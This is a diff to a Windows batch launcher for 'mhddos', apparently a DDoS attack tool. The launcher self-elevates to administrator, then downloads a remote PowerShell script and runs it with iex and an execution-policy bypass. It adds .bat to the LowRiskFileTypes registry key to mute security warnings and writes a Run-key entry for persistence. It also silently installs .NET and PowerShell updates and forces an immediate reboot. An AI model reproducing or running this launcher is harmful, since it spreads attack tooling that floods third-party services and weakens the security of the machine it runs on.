@@ -2,6 +2,7 @@
 if not "%1"=="am_admin" ( powershell start -verb runas '%0' 'am_admin "%~1" "%~2"' & exit )
 call:REG_autorun_del
 call:REG_lowrisk_del
+cls
 set "_PS1_COMMAND=[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; cls; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wvzxn/mhddos-proxy-py/main/mhddos.ps1'))"
 :: set "_PS1_COMMAND=& '%~dp0mhddos.ps1'"
 :: ----------------------------------------------------------------------------------------------------------------------------------
@@ -10,16 +11,24 @@ set "_PS1_COMMAND=[Net.ServicePointManager]::SecurityProtocol = [System.Net.Secu
 call:OSver
 :: [.NET Framework 4.5+] check
 call:.NETver
-if %_net% LSS 378389 ( call:.NETsetup & goto:start)
+if %_NET_short:.=% LSS 45 ( call:.NETsetup & goto:start)
 :: Powershell version check
 call:PWSHver
-if %_PWSHold% EQU 1 call:PWSHsetup
+if %_PWSH% LSS 3 call:PWSHsetup
+:: 
+:: echo OS - %_OS% ; .NET - %_NET% ; PWSH - %_PWSH%.0
+:: pause
+:: 
+
 :: Get command from ps1 on server
 :ps1
 start "mhddos" powershell -executionpolicy bypass -command "%_PS1_COMMAND%"
 :: End
 :end
 exit
+
+::
+::
 ::
 :: ___________________        _______________        _______________        _______________        _______________        
 ::  ___________________        _______________        _______________        _______________        _______________       
@@ -31,6 +40,9 @@ exit
 ::        ___\//\\\\//\\\____        ____\//\\\_____        __/\\\\\\\\\\\_        __/\\\/\///\\\_        _\/\\\___\/\\\_ 
 ::         ____\///__\///_____        _____\///______        _\///////////__        _\///____\///__        _\///____\///__
 ::
+::
+::
+
 :: [>---- Temp folder ----<]
 :mkdir-temp
 set "folder=%TMP%\mhddos-temp"
@@ -43,8 +55,8 @@ exit /b 0
 
 :: [>---- OS Version Check ----<]
 :OSver
-for /f "tokens=4-5 delims=. " %%i in ('ver') do set _OSver=%%i%%j
-if %_OSver% GTR 60 exit /b 0
+for /f "tokens=4-5 delims=. " %%i in ('ver') do set _OS=%%i.%%j
+if %_OS:.=% GTR 60 exit /b 0
 echo Your Windows is not supported
 pause
 goto:end
@@ -53,27 +65,21 @@ goto:end
 :.NETver
 reg query "HKLM\Software\Microsoft\NET Framework Setup\NDP\v4\Full" >nul
 cls
-if %errorlevel% NEQ 0 ( for /f "skip=2 tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5" /v Version') do set _NETver=%%a & set _net=0 ) else ( call:.NET4 )
-set "_NETver=%_NETver: =%"
-exit /b 0
-
-:.NET4
-for /f "skip=2 tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Version') do cls & set _NETver=%%a
-set "_NETver=%_NETver: =%"
-set "_net=%_NETver:.=%"
+if %errorlevel% NEQ 0 ( for /f "skip=2 tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5" /v Version') do set _NET=%%a ) else ( for /f "skip=2 tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Version') do set _NET=%%a )
+set "_NET_short=%_NET:~0,3%"
 exit /b 0
 
 :.NETsetup
-echo ^(!^) Missing .NET Framework 4.5+ ^[Your version is %_NETver%^]
+echo ^(!^) // Missing .NET Framework 4.5+ ^(Your version is %_NET%^)
 pause
 call:mkdir-temp
 :.NETsetup_download
 call:.NETsetup_WebClient
 :: Retry connection
 if not exist "%folder%\ndp452.exe" echo Retrying connection to Microsoft Server... & goto:.NETsetup_download
-echo // Installing . . .
+echo ^(!^) // Installing . . .
 powershell -executionpolicy bypass -command "Start-Process -FilePath '%folder%\ndp452.exe' -Wait -ArgumentList '/q /norestart'"
-echo // done !
+echo ^(!^) // done !
 timeout 5 >nul
 exit /b 0
 
@@ -84,26 +90,30 @@ exit /b 0
 
 :: [>---- Powershell ----<]
 :PWSHver
-powershell -executionpolicy bypass -command "if ($PSVersionTable.PSVersion.Major -lt 3) {exit 2}"
-if %errorlevel% EQU 2 ( set _PWSHold=1 ) else ( set _PWSHold=0 )
+powershell -executionpolicy bypass -command "exit $PSVersionTable.PSVersion.Major"
+set _PWSH=%errorlevel%
 exit /b 0
 
 :PWSHsetup
-echo ^(!^) Missing ^Powershell 3.0+
-echo ^(!^) ^[WARNING^] After the installation restart required
+cls
+echo ^(!^) // Missing ^Powershell 3.0+ ^(Your version is %_PWSH%.0^)
+echo ^(!^) // After the installation restart required
 pause
 call:mkdir-temp
 :PWSHsetup_download
 if %PROCESSOR_ARCHITECTURE% EQU x86 ( call:PWSHsetup_WebClient_x86 ) else ( call:PWSHsetup_WebClient )
 :: Retry connection
 if not exist "%folder%\wmn3.msu" echo Retrying connection to Microsoft Server... & goto:PWSHsetup_download
+echo ^(!^) // Installing . . .
+powershell -executionpolicy bypass -command "Start-Process -FilePath '%folder%\wmn3.msu' -Wait -ArgumentList '/quiet /norestart'"
 call:REG_lowrisk
 call:REG_autorun
-cls
-echo // Installing ^[Windows Management Framework 3.0^] . . .
-powershell -executionpolicy bypass -command "Start-Process -FilePath '%folder%\wmn3.msu' -Wait -ArgumentList '/quiet /warnrestart'"
-echo // done !
+echo ^(!^) // done !
 timeout 5 >nul
+cls
+echo ^(!^) // Restart required, please save your work
+pause
+shutdown -t 0 -r -f
 exit
 
 :PWSHsetup_WebClient
@@ -118,25 +128,26 @@ exit /b 0
 :: [>---- regedit ----<]
 :REG_lowrisk
 set "_REG_lowrisk=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Associations"
-reg query "%_REG_lowrisk%\LowRiskFileTypes" >nul
-if %errorlevel% EQU 1 ( reg add "%_REG_lowrisk%" >nul & reg add "%_REG_lowrisk%" /v "LowRiskFileTypes" /d ".bat" /f >nul )
+reg query "%_REG_lowrisk%" >nul
+if %errorlevel% EQU 1 reg add "%_REG_lowrisk%"
+reg add "%_REG_lowrisk%" /v "LowRiskFileTypes" /d ".bat" /f
 exit /b 0
 
 :REG_lowrisk_del
-set "_REG_lowrisk=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Associations"
-reg query "%_REG_lowrisk%\LowRiskFileTypes" >nul
-if %errorlevel% NEQ 1 reg delete /v "%_REG_lowrisk_del%" /f >nul
+set "_REG_lowrisk_del=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Associations"
+reg query "%_REG_lowrisk_del%"
+if %errorlevel% NEQ 1 reg delete "%_REG_lowrisk_del%" /v "LowRiskFileTypes" /f
 exit /b 0
 
 :REG_autorun
-set "_REG_autorun=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+set "_REG_autorun=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
 reg query "%_REG_autorun%" >nul
 if %errorlevel% EQU 1 reg add /v "%_REG_autorun%" /f >nul
 reg add "%_REG_autorun%" /v "mhddos.bat on next boot" /d "%~f0" /f >nul
 exit /b 0
 
 :REG_autorun_del
-set "_REG_autorun_del=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-reg query "%_REG_autorun_del%\mhddos.bat on next boot" >nul
-if %errorlevel% NEQ 1 reg delete /v "%_REG_autorun_del%" /f >nul
+set "_REG_autorun_del=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
+reg query "%_REG_autorun_del%"
+if %errorlevel% NEQ 1 reg delete "%_REG_autorun_del%" /v "mhddos.bat on next boot" /f
 exit /b 0
